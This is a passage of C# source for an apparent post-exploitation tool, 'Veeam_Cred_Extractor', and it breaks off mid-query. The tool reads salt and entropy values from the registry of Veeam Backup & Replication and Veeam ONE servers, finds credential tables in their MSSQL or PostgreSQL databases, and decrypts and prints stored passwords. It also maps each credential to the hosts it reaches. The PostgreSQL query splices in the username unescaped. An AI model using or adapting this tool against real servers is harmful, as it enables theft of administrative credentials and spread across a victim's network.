using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using Microsoft.Win32;


namespace Veeam_Cred_Extractor
{
    internal class Program
    {
        static bool DEBUG = false;
        static byte[] VeeamSalt = null;
        static byte[] VeeamEntropy = null;
        static readonly byte[] VeeamOneStaticEntropy = Encoding.Unicode.GetBytes("{F0F8C9DE-AB1E-48b6-8221-665E5B016E70}");

        static string[] possiblePsqlPaths = {
                        @"C:\Program Files\PostgreSQL\18\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\17\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\16\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\15\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\14\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\13\bin\psql.exe",
                        @"C:\Program Files\PostgreSQL\12\bin\psql.exe"
                    };

        static string[] possibleMssqlPaths = {
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\140\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\150\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\160\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\180\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\180\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\170\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\160\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\150\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\140\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server\130\Tools\Binn\sqlcmd.exe",
                        @"C:\Program Files\Microsoft SQL Server Management Studio 18\Common7\IDE\Extensions\Microsoft\SQLCMD\sqlcmd.exe",
                        @"C:\Program Files\SQLCMD\sqlcmd.exe",
                        @"C:\Windows\System32\sqlcmd.exe"
                    };


        static void Main(string[] args)
        {
            if (args.Length == 0 || args[0] == "-h" || args[0] == "--help")
            {
                PrintHelp();
                return;
            }

            string action = args[0].ToLower();
            string veeamDbName = "VeeamBackup";
            string veeamOneDb = "VeeamONE";
            string sqlcmdPath = "sqlcmd.exe";
            string psqlPath = null;
            string targetUser = null;
            string sqlServerName = null;
            bool listUsers = false;
            bool veeamOne = false;

            for (int i = 1; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-v":
                        if (i + 1 < args.Length) { veeamDbName = args[++i]; veeamOneDb = veeamDbName; }
                        else { Console.WriteLine("[ERROR] -v requires a database name."); return; }
                        break;
                    case "-m":
                        if (i + 1 < args.Length) sqlcmdPath = args[++i];
                        else { Console.WriteLine("[ERROR] -m requires a path to sqlcmd.exe."); return; }
                        break;
                    case "-p":
                        if (i + 1 < args.Length) psqlPath = args[++i];
                        else { Console.WriteLine("[ERROR] -p requires a path to psql.exe."); return; }
                        break;
                    case "-s":
                        if (i + 1 < args.Length) sqlServerName = args[++i];
                        else { Console.WriteLine("[ERROR] -s requires a SQL Server instance name."); return; }
                        break;
                    case "-l":
                        listUsers = true;
                        break;
                    case "-u":
                        if (i + 1 < args.Length) targetUser = args[++i];
                        else { Console.WriteLine("[ERROR] -u requires a username."); return; }
                        break;
                    case "-o":
                        veeamOne = true;
                        break;
                    case "-d":
                        DEBUG = true;
                        Console.WriteLine("** Debug Mode Enabled **");
                        break;
                    default:
                        Console.WriteLine($"[ERROR] Unknown argument or multiple actions defined: {args[i]}");
                        Console.WriteLine("[PRO-TIP] Read the help menu...");
                        return;
                }
            }

            if (sqlcmdPath == "sqlcmd.exe")
            {
                var found = Array.Find(possibleMssqlPaths, File.Exists);
                if (found != null)
                {
                    sqlcmdPath = found;
                    if (DEBUG)
                        Console.WriteLine($"[DEBUG] Auto-detected sqlcmd.exe: {sqlcmdPath}");
                }
            }

            try
            {
                if (action == "mssql")
                {
                    if (veeamOne)
                    {
                        string server, db;
                        if (!ResolveVeeamOneConnection(sqlServerName, veeamOneDb, out server, out db)) return;
                        InitialiseVeeamEntropy();
                        ExtractMssql(server, db, listUsers, targetUser, true);
                    }
                    else
                    {
                        string server, db;
                        if (!ResolveVbrMssqlConnection(sqlServerName, veeamDbName, out server, out db)) return;
                        if (!listUsers) InitialiseVeeamSalt();
                        ExtractMssql(server, db, listUsers, targetUser, false);
                    }
                }
                else if (action == "psql")
                {
                    string psqlExe, psqlUser, db;
                    if (!ResolveVbrPsqlConnection(psqlPath, veeamDbName, out psqlExe, out psqlUser, out db)) return;
                    if (!listUsers) InitialiseVeeamSalt();
                    ExtractPsql(psqlExe, psqlUser, db, listUsers, targetUser);
                }
                else if (action == "enum")
                {
                    RunEnumeration();
                }
                else if (action == "map")
                {
                    RunMap(veeamOne, sqlcmdPath, psqlPath, sqlServerName, veeamDbName, veeamOneDb);
                }
                else if (action == "auto")
                {
                    RunAuto(veeamOne, sqlcmdPath, psqlPath, sqlServerName, veeamDbName, veeamOneDb);
                }
                else
                {
                    Console.WriteLine("[ERROR] Unknown action type. Use | 'enum' | 'mssql' | 'psql' | 'auto' | 'map' |");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] " + ex.Message);
            }
        }

        // ======================== Connection Resolution ========================

        static bool ResolveVeeamOneConnection(string sqlServerOverride, string dbDefault, out string server, out string db)
        {
            var reg = GetVeeamRegistryValues(@"SOFTWARE\Veeam\Veeam ONE", "DatabaseServer", "DatabaseName");
            reg.TryGetValue("DatabaseServer", out var regServer);
            reg.TryGetValue("DatabaseName", out var regDb);

            server = sqlServerOverride ?? regServer;
            db = (regDb != null && dbDefault == "VeeamONE") ? regDb : dbDefault;

            if (string.IsNullOrEmpty(server))
            {
                Console.WriteLine("[ERROR] Veeam One SQL Server not found in registry. Use -s to specify it manually.");
                return false;
            }

            Console.WriteLine($"[INFO] MSSQL instance: {server}");
            Console.WriteLine($"[INFO] Database: {db}");
            return true;
        }

        static bool ResolveVbrMssqlConnection(string sqlServerOverride, string dbDefault, out string server, out string db)
        {
            var reg = GetVeeamRegistryValues(
                @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql",
                "SQLInstanceName", "SqlDatabaseName");

            if (sqlServerOverride != null)
                server = sqlServerOverride;
            else if (reg.TryGetValue("SQLInstanceName", out var instance))
                server = $".\\{instance}";
            else
            {
                server = null; db = null;
                Console.WriteLine("[ERROR] SQL Server instance not found in registry. Use -s to specify it manually.");
                return false;
            }

            db = reg.TryGetValue("SqlDatabaseName", out var regDb) ? regDb : dbDefault;
            Console.WriteLine($"[INFO] MSSQL instance: {server}");
            Console.WriteLine($"[INFO] Database: {db}");
            return true;
        }

        static bool ResolveVbrPsqlConnection(string psqlPathOverride, string dbDefault,
            out string psqlExe, out string psqlUser, out string db)
        {
            psqlExe = psqlPathOverride ?? Array.Find(possiblePsqlPaths, File.Exists);
            if (psqlExe == null)
            {
                psqlUser = null; db = null;
                Console.WriteLine("[ERROR] psql.exe not found. Provide path using -p option.");
                return false;
            }

            var reg = GetVeeamRegistryValues(
                @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\postgresql",
                "PostgresUserForWindowsAuth", "SqlDatabaseName");

            psqlUser = reg.TryGetValue("PostgresUserForWindowsAuth", out var u) ? u : "postgres";
            db = reg.TryGetValue("SqlDatabaseName", out var d) ? d : dbDefault;

            Console.WriteLine($"[INFO] PostgreSQL binary: {psqlExe}");
            Console.WriteLine($"[INFO] Database: {db}");
            Console.WriteLine($"[INFO] PostgreSQL user: {psqlUser}");
            return true;
        }

        // ======================== Credential Extraction ========================

        static void ExtractMssql(string server, string db,
            bool listUsers, string targetUser, bool isVeeamOne)
        {
            var tables = DiscoverAllCredentialTablesMssql(server, db);
            if (tables.Count == 0)
            {
                Console.WriteLine("[WARN] No credential tables found in database.");
                return;
            }

            Console.WriteLine($"[INFO] Found {tables.Count} credential table(s)");
            string connStr = $"Server={server};Database={db};Integrated Security=True;";
            using (var conn = new SqlConnection(connStr))
            {
                conn.Open();
                foreach (var cred in tables)
                {
                    Console.WriteLine($"\n[INFO] Extracting from [{cred.Schema}].[{cred.Table}]");

                    string descExpr = cred.DescCol != null ? $"[{cred.DescCol}]" : "'' as [description]";
                    string query;
                    if (listUsers)
                        query = $"SELECT [{cred.UserCol}], {descExpr} FROM [{cred.Schema}].[{cred.Table}]";
                    else if (targetUser != null)
                        query = $"SELECT [{cred.UserCol}], [{cred.PassCol}], {descExpr} FROM [{cred.Schema}].[{cred.Table}] WHERE LOWER([{cred.UserCol}]) = LOWER(@user)";
                    else
                        query = $"SELECT [{cred.UserCol}], [{cred.PassCol}], {descExpr} FROM [{cred.Schema}].[{cred.Table}]";

                    try
                    {
                        using (var cmd = new SqlCommand(query, conn))
                        {
                            if (targetUser != null)
                                cmd.Parameters.AddWithValue("@user", targetUser);

                            using (var reader = cmd.ExecuteReader())
                            {
                                bool headerPrinted = false;
                                while (reader.Read())
                                {
                                    if (reader.IsDBNull(0)) continue;
                                    string username = reader.GetValue(0).ToString().Trim();
                                    if (string.IsNullOrWhiteSpace(username)) continue;

                                    if (!headerPrinted)
                                    {
                                        headerPrinted = true;
                                        Console.WriteLine("=====================================");
                                        Console.WriteLine(listUsers ? "|           LISTING USERS           |" : "|        JUICY CREDS LOADING        |");
                                        Console.WriteLine("=====================================");
                                    }

                                    if (listUsers)
                                    {
                                        string desc = reader.IsDBNull(1) ? "" : reader.GetValue(1).ToString().Trim();
                                        Console.WriteLine($"Username   : {username}");
                                        Console.WriteLine($"Description: {desc}");
                                        Console.WriteLine("---------------------------------------------");
                                    }
                                    else
                                    {
                                        if (reader.IsDBNull(1)) continue;

                                        string encrypted;
                                        object val = reader.GetValue(1);
                                        bool isBinary = val is byte[];
                                        if (isBinary)
                                            encrypted = Convert.ToBase64String((byte[])val);
                                        else
                                            encrypted = val.ToString().Trim();

                                        if (string.IsNullOrWhiteSpace(encrypted)) continue;

                                        if (DEBUG)
                                        {
                                            string preview = encrypted.Length > 40 ? encrypted.Substring(0, 40) + "..." : encrypted;
                                            Console.WriteLine($"[DEBUG] {username}: type={val.GetType().Name}, binary={isBinary}, len={encrypted.Length}, preview={preview}");
                                        }

                                        string desc = reader.IsDBNull(2) ? "" : reader.GetValue(2).ToString().Trim();

                                        try
                                        {
                                            string password = TryDecrypt(encrypted, isVeeamOne);
                                            if (password == null)
                                            {
                                                Console.WriteLine($"[WARN] Could not decrypt credentials for: {username}");
                                                if (DEBUG) Console.WriteLine($"[DEBUG] All decryption methods failed for {username}");
                                                continue;
                                            }
                                            Console.WriteLine($"Username   : {username}");
                                            Console.WriteLine($"Password   : {password}");
                                            Console.WriteLine($"Description: {desc}");
                                            Console.WriteLine("---------------------------------------------");
                                        }
                                        catch (Exception ex)
                                        {
                                            if (DEBUG) Console.WriteLine(ex.ToString());
                                            Console.WriteLine($"[ERROR] Failed to decrypt {username}");
                                        }
                                    }
                                }
                                if (!headerPrinted && DEBUG)
                                    Console.WriteLine("[DEBUG] Table is empty, skipping");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[ERROR] Query failed on [{cred.Schema}].[{cred.Table}]: {ex.Message}");
                    }
                }
            }
        }

        static void ExtractPsql(string psqlExe, string user, string db,
            bool listUsers, string targetUser)
        {
            var tables = DiscoverAllCredentialTablesPsql(psqlExe, db, user);
            if (tables.Count == 0)
            {
                Console.WriteLine("[WARN] No credential tables found in database.");
                return;
            }

            Console.WriteLine($"[INFO] Found {tables.Count} credential table(s)");
            foreach (var cred in tables)
            {
                Console.WriteLine($"\n[INFO] Extracting from {cred.Schema}.{cred.Table}");

                string query;
                if (listUsers)
                {
                    query = $"SELECT {cred.UserCol},{cred.PsqlDescExpr} FROM {cred.Table};";
                }
                else if (targetUser != null)
                {
                    query = $"SELECT {cred.UserCol},{cred.PassCol},{cred.PsqlDescExpr} FROM {cred.Table} WHERE {cred.UserCol} ILIKE '{targetUser}';";
                }
                else
                {
                    query = $"SELECT {cred.UserCol},{cred.PassCol},{cred.PsqlDescExpr} FROM {cred.Table};";
                }

                var psi = BuildPsqlPsi(psqlExe, db, user, query);
                Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");
                RunAndProcess(psi, listUsers, false);
            }
        }

        // ======================== Auto Mode ========================

        static void RunAuto(bool veeamOne, string sqlcmdPath, string psqlPath,
            string sqlServerName, string veeamDbName, string veeamOneDb)
        {
            Console.WriteLine("=====================================");
            Console.WriteLine("|       VEEAM AUTO EXTRACTION       |");
            Console.WriteLine("=====================================");

            bool backupExists = RegistryKeyExists(@"SOFTWARE\Veeam\Veeam Backup and Replication");
            bool oneExists = RegistryKeyExists(@"SOFTWARE\Veeam\Veeam ONE");
            Console.WriteLine($"[INFO] Veeam Backup and Replication Registry Entries Exist: {backupExists}");
            Console.WriteLine($"[INFO] Veeam One Registry Entries Exist: {oneExists}");

            if (backupExists)
            {
                Console.WriteLine("[INFO] Performing Veeam Backup and Replication Extraction");
                veeamOne = false;
            }
            else if (oneExists)
            {
                Console.WriteLine("[INFO] Performing Veeam One Extraction");
                veeamOne = true;
            }
            else
            {
                Console.WriteLine("[ERROR] Cannot Identify Type of Veeam Server!");
                return;
            }

            if (!veeamOne)
            {
                InitialiseVeeamSalt();

                var dbConfigKey = @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations";
                var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "SqlActiveConfiguration");
                if (!dbTypeDict.TryGetValue("SqlActiveConfiguration", out var dbtype))
                {
                    Console.WriteLine("[ERROR] SqlActiveConfiguration not found in registry.");
                    return;
                }

                Console.WriteLine($"[INFO] Database type found in Registry: {dbtype}");

                if (string.Equals(dbtype, "mssql", StringComparison.OrdinalIgnoreCase))
                {
                    string server, db;
                    if (!ResolveVbrMssqlConnection(sqlServerName, veeamDbName, out server, out db)) return;
                    ExtractMssql(server, db, false, null, false);
                }
                else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                {
                    string psqlExe, psqlUser, db;
                    if (!ResolveVbrPsqlConnection(psqlPath, veeamDbName, out psqlExe, out psqlUser, out db)) return;
                    ExtractPsql(psqlExe, psqlUser, db, false, null);
                }
            }
            else
            {
                InitialiseVeeamEntropy();
                Console.WriteLine("[INFO] Veeam One info found in Registry:");

                string server, db;
                if (!ResolveVeeamOneConnection(sqlServerName, veeamOneDb, out server, out db)) return;
                ExtractMssql(server, db, false, null, true);
            }
        }

        // ======================== Map Mode ========================

        static void RunMap(bool veeamOne, string sqlcmdPath, string psqlPath,
            string sqlServerName, string veeamDbName, string veeamOneDb)
        {
            Console.WriteLine("=====================================");
            Console.WriteLine("|        MAPPING CREDENTIALS        |");
            Console.WriteLine("=====================================");

            if (!veeamOne)
            {
                var dbConfigKey = @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations";
                var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "SqlActiveConfiguration");
                if (!dbTypeDict.TryGetValue("SqlActiveConfiguration", out var dbtype))
                {
                    Console.WriteLine("[ERROR] SqlActiveConfiguration not found in registry.");
                    return;
                }

                Console.WriteLine($"[INFO] Database type found in Registry: {dbtype}");

                if (string.Equals(dbtype, "mssql", StringComparison.OrdinalIgnoreCase))
                {
                    string server, db;
                    if (!ResolveVbrMssqlConnection(sqlServerName, veeamDbName, out server, out db)) return;

                    var cred = DiscoverCredentialsMssql(server, db, "dbo", "Credentials", "user_name");
                    var containerInfo = DiscoverTableMssql(server, db, "Container");
                    string containerFqn = containerInfo != null ? $"[{containerInfo["schema"]}].[{containerInfo["table"]}]" : "[dbo].[EPContainers]";
                    Console.WriteLine($"[INFO] Container table: {containerFqn}");

                    string query = $"SELECT t1.[{cred.UserCol}], STUFF((SELECT ', ' + t2.name FROM {containerFqn} AS t2 WHERE t2.creds_id = t1.id ORDER BY t2.name FOR XML PATH('')), 1, 2, '') as hosts FROM [{cred.Schema}].[{cred.Table}] AS t1 WHERE EXISTS (SELECT 1 FROM {containerFqn} WHERE creds_id = t1.id) ORDER BY t1.[{cred.UserCol}];";

                    var mapping = ExecuteMapQueryMssql(server, db, query);
                    PrintCredentialHostTable(mapping);
                }
                else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                {
                    string psqlExe, psqlUser, db;
                    if (!ResolveVbrPsqlConnection(psqlPath, veeamDbName, out psqlExe, out psqlUser, out db)) return;

                    var cred = DiscoverCredentials(DiscoverTablePsql(psqlExe, db, psqlUser, "redential"), "public", "credentials", "user_name");
                    var containerInfo = DiscoverTablePsql(psqlExe, db, psqlUser, "container");
                    string containerTable = containerInfo != null ? containerInfo["table"] : "epcontainers";
                    Console.WriteLine($"[INFO] Container table: {containerTable}");

                    string query = $"SELECT t1.{cred.UserCol},STRING_AGG(t2.name, ', ') as hosts FROM {cred.Table} AS t1 INNER JOIN {containerTable} AS t2 ON t1.id = t2.creds_id GROUP BY t1.{cred.UserCol} ORDER BY t1.{cred.UserCol};";

                    var mapping = ExecuteMapQuery(BuildPsqlPsi(psqlExe, db, psqlUser, query));
                    PrintCredentialHostTable(mapping);
                }
            }
            else
            {
                string server, db;
                if (!ResolveVeeamOneConnection(sqlServerName, veeamOneDb, out server, out db)) return;

                var cred = DiscoverCredentialsMssql(server, db, "monitor", "Credentials", "username");

                var linkInfo = DiscoverTableMssql(server, db, "redential%Link");
                string linkFqn = linkInfo != null ? $"[{linkInfo["schema"]}].[{linkInfo["table"]}]" : $"[{cred.Schema}].[CredentialsLink]";
                var entityInfo = DiscoverTableMssql(server, db, "Entity");
                string entityFqn = entityInfo != null ? $"[{entityInfo["schema"]}].[{entityInfo["table"]}]" : $"[{cred.Schema}].[Entity]";

                string query = $"SELECT t1.[{cred.UserCol}], STUFF((SELECT ', ' + t3.host_name FROM {linkFqn} AS t2 INNER JOIN {entityFqn} AS t3 ON t2.entity_id = t3.host_id WHERE t2.cred_id = t1.id ORDER BY t3.host_name FOR XML PATH('')), 1, 2, '') as hosts FROM [{cred.Schema}].[{cred.Table}] AS t1 WHERE EXISTS (SELECT 1 FROM {linkFqn} WHERE cred_id = t1.id) ORDER BY t1.[{cred.UserCol}];";

                var mapping = ExecuteMapQueryMssql(server, db, query);
                PrintCredentialHostTable(mapping);
            }
        }

        // ======================== Enumeration ========================

        static void RunEnumeration()
        {
            Console.WriteLine("=====================================");
            Console.WriteLine("|     RUNNING VEEAM ENUMERATION     |");
            Console.WriteLine("=====================================");

            string[] foundPsql = possiblePsqlPaths.Where(File.Exists).Distinct(StringComparer.OrdinalIgnoreCase).ToArray();
            string[] foundSqlcmd = possibleMssqlPaths.Where(File.Exists).Distinct(StringComparer.OrdinalIgnoreCase).ToArray();

            if (foundPsql.Length > 0)
            {
                Console.WriteLine("[INFO] psql.exe binaries found:");
                foreach (string p in foundPsql) Console.WriteLine($"  - {p}");
            }
            else if (DEBUG)
                Console.WriteLine("[DEBUG] psql.exe binary not found on this server");

            if (foundSqlcmd.Length > 0)
            {
                Console.WriteLine("[INFO] sqlcmd.exe binaries found:");
                foreach (string p in foundSqlcmd) Console.WriteLine($"  - {p}");
            }
            else if (DEBUG)
                Console.WriteLine("[DEBUG] sqlcmd.exe binary not found on this server");

            bool postgresRunning = false, mssqlRunning = false;
            try
            {
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        if (p.ProcessName.Equals("postgres", StringComparison.OrdinalIgnoreCase)) postgresRunning = true;
                        else if (p.ProcessName.Equals("sqlservr", StringComparison.OrdinalIgnoreCase)) mssqlRunning = true;
                    }
                    catch { }
                    finally { p.Dispose(); }
                }
            }
            catch { }

            Console.WriteLine("[INFO] Database detection summary:");
            Console.WriteLine(postgresRunning ? "  - PostgreSQL process detected" : "  - PostgreSQL process not detected");
            Console.WriteLine(mssqlRunning ? "  - MSSQL process detected" : "  - MSSQL process not detected");
            if (!postgresRunning && !mssqlRunning) Console.WriteLine("  - No database engine processes detected");

            Console.WriteLine("[INFO] Registry enumeration:");
            var dbConfigKey = @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations";
            var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "SqlActiveConfiguration");
            if (dbTypeDict.TryGetValue("SqlActiveConfiguration", out var dbtype))
            {
                Console.WriteLine($"  - Database type: {dbtype}");
                if (string.Equals(dbtype, "MsSql", StringComparison.OrdinalIgnoreCase))
                {
                    var v = GetVeeamRegistryValues(dbConfigKey + @"\mssql", "SQLInstanceName", "SqlDatabaseName");
                    if (v.TryGetValue("SQLInstanceName", out var inst)) Console.WriteLine($"  - MSSQL instance: {inst}");
                    if (v.TryGetValue("SqlDatabaseName", out var vdb)) Console.WriteLine($"  - MSSQL database: {vdb}");
                }
                else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                {
                    var v = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
                    if (v.TryGetValue("PostgresUserForWindowsAuth", out var u)) Console.WriteLine($"  - PSQL username: {u}");
                    if (v.TryGetValue("SqlDatabaseName", out var vdb)) Console.WriteLine($"  - PSQL database: {vdb}");
                }
            }

            var oneReg = GetVeeamRegistryValues(@"SOFTWARE\Veeam\Veeam ONE", "DatabaseName", "DatabaseServer");
            if (oneReg.TryGetValue("DatabaseName", out var oneDb)) Console.WriteLine($"  - Veeam One database: {oneDb}");
            if (oneReg.TryGetValue("DatabaseServer", out var oneSrv)) Console.WriteLine($"  - Veeam One server: {oneSrv}");
        }

        // ======================== PSI Builders ========================

        static ProcessStartInfo BuildMssqlPsi(string sqlcmdPath, string server, string db, string query)
        {
            return new ProcessStartInfo
            {
                FileName = sqlcmdPath,
                Arguments = $"-S {server} -E -d {db} -Q \"{query}\" -h -1 -s\":\" -y 8000 -w 65535",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
        }

        static ProcessStartInfo BuildPsqlPsi(string psqlExe, string db, string user, string query)
        {
            return new ProcessStartInfo
            {
                FileName = psqlExe,
                Arguments = $"-d {db} -U {user} -A -F : -t -c \"{query}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
        }

        // ======================== Credential Table Info ========================

        struct CredInfo
        {
            public string Schema, Table, UserCol, PassCol, DescCol;
            public string MssqlDescExpr => DescCol != null ? $"[{DescCol}]" : "'' as [description]";
            public string PsqlDescExpr => DescCol ?? "'' as description";
        }

        static CredInfo DiscoverCredentials(Dictionary<string, string> tableInfo,
            string defaultSchema, string defaultTable, string defaultUserCol)
        {
            if (tableInfo != null)
            {
                tableInfo.TryGetValue("descriptionCol", out var dc);
                var info = new CredInfo
                {
                    Schema = tableInfo["schema"],
                    Table = tableInfo["table"],
                    UserCol = (tableInfo.TryGetValue("usernameCol", out var uc) ? uc : defaultUserCol),
                    PassCol = (tableInfo.TryGetValue("passwordCol", out var pc) ? pc : "password"),
                    DescCol = dc
                };
                Console.WriteLine($"[INFO] Discovered table: [{info.Schema}].[{info.Table}]");
                return info;
            }

            Console.WriteLine($"[WARN] Could not discover table, using default: [{defaultSchema}].[{defaultTable}]");
            return new CredInfo
            {
                Schema = defaultSchema, Table = defaultTable,
                UserCol = defaultUserCol, PassCol = "password", DescCol = "description"
            };
        }

        // ======================== Registry Helpers ========================

        static bool RegistryKeyExists(string subkeyPath)
        {
            try
            {
                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var key = hklm.OpenSubKey(subkeyPath))
                    return key != null;
            }
            catch { return false; }
        }

        static Dictionary<string, string> GetVeeamRegistryValues(string subkeyPath, params string[] valueNames)
        {
            var result = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            try
            {
                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var key = hklm.OpenSubKey(subkeyPath))
                {
                    if (key != null)
                    {
                        foreach (var name in valueNames)
                        {
                            var val = key.GetValue(name) as string;
                            if (!string.IsNullOrEmpty(val))
                                result[name] = val;
                        }
                    }
                    else if (DEBUG)
                        Console.WriteLine($"[DEBUG] Failed to read registry key: {subkeyPath}");
                }
            }
            catch (Exception ex) { Console.WriteLine("[ERROR] " + ex.Message); }
            return result;
        }

        static void InitialiseVeeamSalt()
        {
            try
            {
                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var key = hklm.OpenSubKey(@"SOFTWARE\Veeam\Veeam Backup and Replication\Data"))
                {
                    if (key != null)
                    {
                        var saltBase64 = key.GetValue("EncryptionSalt") as string;
                        if (!string.IsNullOrEmpty(saltBase64))
                            VeeamSalt = Convert.FromBase64String(saltBase64);
                    }
                }
            }
            catch (Exception ex) { Console.WriteLine("[ERROR] " + ex.Message); }

            if (DEBUG && VeeamSalt == null)
                Console.WriteLine("[DEBUG] EncryptionSalt not found; V decryption may fail");
        }

        static void InitialiseVeeamEntropy()
        {
            try
            {
                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (var key = hklm.OpenSubKey(@"SOFTWARE\Veeam\Veeam ONE\Private"))
                {
                    if (key != null)
                    {
                        var entropyValue = key.GetValue("Entropy") as byte[];
                        if (entropyValue != null && entropyValue.Length > 0)
                        {
                            VeeamEntropy = entropyValue;
                            Console.WriteLine($"[INFO] Loaded Veeam One Entropy value ({VeeamEntropy.Length} bytes)");
                            if (DEBUG)
                                Console.WriteLine($"[DEBUG] Entropy: {BitConverter.ToString(VeeamEntropy).Replace("-", "")}");
                        }
                        else if (DEBUG)
                            Console.WriteLine("[DEBUG] Entropy value is empty or missing");
                    }
                    else if (DEBUG)
                        Console.WriteLine("[DEBUG] Veeam One Private registry key not found");
                }
            }
            catch (Exception ex) { Console.WriteLine("[ERROR] Reading Veeam Entropy: " + ex.Message); }

            if (DEBUG && VeeamEntropy == null)
                Console.WriteLine("[DEBUG] Entropy not found, Veeam One decryption may fail");
        }

        // ======================== Table Discovery ========================

        static CredInfo DiscoverCredentialsMssql(string server, string database,
            string defaultSchema, string defaultTable, string defaultUserCol)
        {
            var tables = DiscoverAllCredentialTablesMssql(server, database);
            if (tables.Count > 0) return tables[0];

            Console.WriteLine($"[WARN] Could not discover table, using default: [{defaultSchema}].[{defaultTable}]");
            return new CredInfo
            {
                Schema = defaultSchema, Table = defaultTable,
                UserCol = defaultUserCol, PassCol = "password", DescCol = "description"
            };
        }

        static Dictionary<string, string> DiscoverTableMssql(string server, string database, string searchPattern)
        {
            string connStr = $"Server={server};Database={database};Integrated Security=True;";
            try
            {
                using (var conn = new SqlConnection(connStr))
                {
                    conn.Open();
                    using (var cmd = new SqlCommand(
                        $"SELECT TOP 1 TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE @pattern AND TABLE_NAME NOT LIKE '%Link%'", conn))
                    {
                        cmd.Parameters.AddWithValue("@pattern", $"%{searchPattern}%");
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.Read())
                            {
                                var info = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                                {
                                    ["schema"] = reader.GetString(0),
                                    ["table"] = reader.GetString(1)
                                };
                                if (DEBUG) Console.WriteLine($"[DEBUG] Found table: [{info["schema"]}].[{info["table"]}]");
                                return info;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (DEBUG) Console.WriteLine($"[DEBUG] Table discovery failed: {ex.Message}");
            }
            return null;
        }

        static List<string[]> ExecuteMapQueryMssql(string server, string database, string query)
        {
            Console.WriteLine($"[INFO] Running query on {server}/{database}");
            if (DEBUG) Console.WriteLine($"[DEBUG] Query: {query}");

            string connStr = $"Server={server};Database={database};Integrated Security=True;";
            var results = new List<string[]>();
            try
            {
                using (var conn = new SqlConnection(connStr))
                {
                    conn.Open();
                    using (var cmd = new SqlCommand(query, conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            if (reader.IsDBNull(0)) continue;
                            string username = reader.GetValue(0).ToString().Trim();
                            string hosts = reader.IsDBNull(1) ? "" : reader.GetValue(1).ToString().Trim();
                            if (!string.IsNullOrWhiteSpace(username))
                                results.Add(new[] { username, hosts });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Map query failed: {ex.Message}");
            }

            if (results.Count == 0)
                Console.WriteLine("[INFO] No rows returned.");

            return results;
        }

        static List<CredInfo> DiscoverAllCredentialTablesMssql(string server, string database)
        {
            var results = new List<CredInfo>();
            string connStr = $"Server={server};Database={database};Integrated Security=True;";

            try
            {
                using (var conn = new SqlConnection(connStr))
                {
                    conn.Open();

                    var candidates = new List<string[]>();
                    using (var cmd = new SqlCommand(@"SELECT DISTINCT c1.TABLE_SCHEMA, c1.TABLE_NAME
                        FROM INFORMATION_SCHEMA.COLUMNS c1
                        INNER JOIN INFORMATION_SCHEMA.COLUMNS c2 ON c1.TABLE_SCHEMA = c2.TABLE_SCHEMA AND c1.TABLE_NAME = c2.TABLE_NAME
